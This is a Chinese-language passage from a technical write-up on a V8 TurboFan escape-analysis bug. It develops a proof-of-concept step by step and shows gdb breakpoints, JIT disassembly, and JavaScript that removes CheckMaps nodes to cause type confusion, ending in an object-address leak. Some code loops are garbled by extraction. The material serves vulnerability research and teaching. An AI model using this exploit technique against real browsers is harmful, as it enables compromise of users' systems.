          for (int i = 0; i ValueInput(i);
            current->SetEscaped(input);
            // 将该节点的map_设置为null
            VirtualObject* vobject = current->GetVirtualObject(input);
            if (vobject) {
              vobject->SetMap(nullptr);
            }
          }
          if (OperatorProperties::HasContextInput(op)) {
            current->SetEscaped(current->ContextInput());
          }
          break;
        }
可以看出这里又清除了`map_`变量的值
###  POC构造与分析
首先得让`vobject->_map`这个变量被赋值，那么就是发生在没有逃逸的时候，会进入分支
    if (vobject && !vobject->HasEscaped() &&
              vobject->FieldAt(OffsetOfFieldAccess(op)).To(&var)) {
然后得让变量进入逃逸状态，这样当进入`case IrOpcode::kCheckMaps:`时能够进入`else if (vobject) {
//逃逸状态}`分支，但要执行到`current->MarkForDeletion();`语句，还得保证`Node* cache_map =
vobject->Map();`不为空。  
首先构造如下的代码
    function opt(foo) {
       var a = [1.1]; //未逃逸
       foo(a); //逃逸
       return a[0];
    }
    //触发JIT编译
    for (var i=0;i{});
    }
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
运行后发现不能像我们预期的那样发生类型混淆，通过gdb调试看一下，在三个patch点下断点
     b escape-analysis.cc:585
     b escape-analysis.cc:738
     b escape-analysis.cc:826
通过调试发现仅能在585这一个分支断下，添加`-print-opt-code`选项可以看到整个代码都被JIT优化了
这样的话JIT编译器可以确定foo做了什么，我们的opt函数就会退化为
    function opt(foo) {
       var a = [1.1]; 
       return a[0];
    }
因此我们得仅让opt这一个函数被优化，由此应该这样
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i{});
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
这样运行，会发现opt的JIT生成了两次，也就是说`print(opt((o)=>{o[0] =
x;}));`这句的opt调用并没有匹配到之前opt生成的JIT代码，查看第一次生成的JIT代码（关键部分）
    0x131a00084fa9    e9  49ba009784e7ad7f0000 REX.W movq r10,0x7fade7849700  (CreateShallowArrayLiteral)    ;; off heap target
    0x131a00084fb3    f3  41ffd2         call r10
    0x131a00084fb6    f6  49c7c504000000 REX.W movq r13,0x4
    0x131a00084fbd    fd  e87ef00b00     call 0x131a00144040     ;; deopt-soft deoptimization bailout
查看第二次JIT生成的关键代码
       f8  488945b8       REX.W movq [rbp-0x48],rax
    0x131a000851dc    fc  4c8b4518       REX.W movq r8,[rbp+0x18]
    0x131a000851e0   100  48bf6d8c14081a130000 REX.W movq rdi,0x131a08148c6d    ;; object: 0x131a08148c6d 
    0x131a000851ea   10a  443bc7         cmpl r8,rdi
    0x131a000851ed   10d  0f85db010000   jnz 0x131a000853ce  
可以看出，第一次并没有匹配参数，而是直接`deopt-soft deoptimization
bailout`，而第二次有匹配参数，判断函数地址是否为指定值，因此，我们再增加几个opt调用看看有什么变化。
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i{});
    opt((o)=>{});
    opt((o)=>{});
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
我们看到，最后一个标号为2，也就是总共生成了opt函数的3份JIT代码，而我们的js里有4个opt函数调用，也就是说，最后的`print(opt((o)=>{o[0]
= x;}));`成功匹配了JIT代码。  
我们查看最后一份的JIT代码
    0x2a000854c0     0  488d1df9ffffff REX.W leaq rbx,[rip+0xfffffff9]
    0x2a000854c7     7  483bd9         REX.W cmpq rbx,rcx
    0x2a000854ca     a  7418           jz 0x2a000854e4  
    0x2a000854cc     c  48ba6a00000000000000 REX.W movq rdx,0x6a
    0x2a000854d6    16  49ba20371523787f0000 REX.W movq r10,0x7f7823153720  (Abort)    ;; off heap target
    0x2a000854e0    20  41ffd2         call r10
    0x2a000854e3    23  cc             int3l
    0x2a000854e4    24  8b59d0         movl rbx,[rcx-0x30]
    0x2a000854e7    27  4903dd         REX.W addq rbx,r13
    0x2a000854ea    2a  f6430701       testb [rbx+0x7],0x1
    0x2a000854ee    2e  740d           jz 0x2a000854fd  
    0x2a000854f0    30  49ba20600523787f0000 REX.W movq r10,0x7f7823056020  (CompileLazyDeoptimizedCode)    ;; off heap target
    0x2a000854fa    3a  41ffe2         jmp r10
    0x2a000854fd    3d  55             push rbp
    0x2a000854fe    3e  4889e5         REX.W movq rbp,rsp
    0x2a00085501    41  56             push rsi
    0x2a00085502    42  57             push rdi
    0x2a00085503    43  50             push rax
    0x2a00085504    44  4883ec10       REX.W subq rsp,0x10
    0x2a00085508    48  488975e0       REX.W movq [rbp-0x20],rsi
    0x2a0008550c    4c  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))
    0x2a00085510    50  0f86c5010000   jna 0x2a000856db  
    0x2a00085516    56  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))
    0x2a0008551a    5a  0f86f4010000   jna 0x2a00085714  
    0x2a00085520    60  b901000000     movl rcx,0x1
    0x2a00085525    65  660f1f840000000000 nop
    0x2a0008552e    6e  6690           nop
    0x2a00085530    70  81f900000200   cmpl rcx,0x20000
    0x2a00085536    76  0f8332000000   jnc 0x2a0008556e  
    0x2a0008553c    7c  83c101         addl rcx,0x1
    0x2a0008553f    7f  49ba0000000001000000 REX.W movq r10,0x100000000
    0x2a00085549    89  4c3bd1         REX.W cmpq r10,rcx
    0x2a0008554c    8c  7715           ja 0x2a00085563  
    0x2a0008554e    8e  48ba0200000000000000 REX.W movq rdx,0x2
    0x2a00085558    98  4c8b1579ffffff REX.W movq r10,[rip+0xffffff79]
    0x2a0008555f    9f  41ffd2         call r10
    0x2a00085562    a2  cc             int3l
    0x2a00085563    a3  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))
    0x2a00085567    a7  77c7           ja 0x2a00085530  
    0x2a00085569    a9  e9cb010000     jmp 0x2a00085739  
    0x2a0008556e    ae  48b9f8c6112c25560000 REX.W movq rcx,0x56252c11c6f8    ;; external reference (Heap::NewSpaceAllocationTopAddress())
    0x2a00085578    b8  4c8b01         REX.W movq r8,[rcx]
    0x2a0008557b    bb  4d8d4820       REX.W leaq r9,[r8+0x20]
    0x2a0008557f    bf  49bb00c7112c25560000 REX.W movq r11,0x56252c11c700    ;; external reference (Heap::NewSpaceAllocationLimitAddress())
    .................................................................
可以看到，最后一份JIT代码中，已经不再对参数进行匹配了，也就是说，即使我们记下来继续调用opt()，参数无论为什么，都会匹配到，我们测试一下
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i{});
    opt((o)=>{});
    opt((o)=>{});
    x = Array(0);
    //print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
    opt(1);
    opt({});
可以看到也只生成了3份JIT代码，最后两句的调用都直接走opt的JIT成功了。
于是，我们的代码可以用for循环来精简一下
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i{});
    }
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
运行后，发现仍然不能发生类型混淆，继续调试  
先是`(v8::internal::compiler::VirtualObject *) 0x5643165e5410`设置了`map_`值
然后`(v8::internal::compiler::VirtualObject *) 0x5643165e5770`设置了`map_`值
接下来发现`(v8::internal::compiler::VirtualObject *) 0x5643165e5770`的`map_`值被清空
接下来到这里，这个分支是当检测到对象逃逸时才会到达，由于前一步把这个`vobject`的`map_`给清空了，导致条件不成立，无法执行到`current->MarkForDeletion();`
上述POC失败的原因是因为在`case
IrOpcode::kCheckMaps:`之前先进入了`default`把`map_`值给清空了，我们可以再对象里再裹一层对象试试。
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i{});
    }
    x = Array(0);
    print(opt((o)=>{o[0][0] = x;})); //在外部函数里改变类型
接下来我们重新调试，我们发现`(const v8::internal::compiler::VirtualObject *)
0x558f95f216c0`这个节点的`checkmaps`被删除了，因此将造成类型混淆
继续运行，发现输出了对象的地址，发生了类型混淆
    pwndbg> p vobject
    $16 = (const v8::internal::compiler::VirtualObject *) 0x558f95f216c0
    pwndbg> c
    Continuing.
    4.765298071534956e-270
    [Thread 0x7f202c139700 (LWP 2742) exited]
    [Thread 0x7f202c93a700 (LWP 2741) exited]
    [Thread 0x7f202d13b700 (LWP 2740) exited]
    [Inferior 1 (process 2739) exited normally]
    pwndbg>
如下是有漏洞的JIT代码
    0x2343000857c8   1a8  488b7d18       REX.W movq rdi,[rbp+0x18]
    0x2343000857cc   1ac  b801000000     movl rax,0x1
    0x2343000857d1   1b1  49bae0bfb6d9a77f0000 REX.W movq r10,0x7fa7d9b6bfe0  (Call_ReceiverIsNullOrUndefined)    ;; off heap target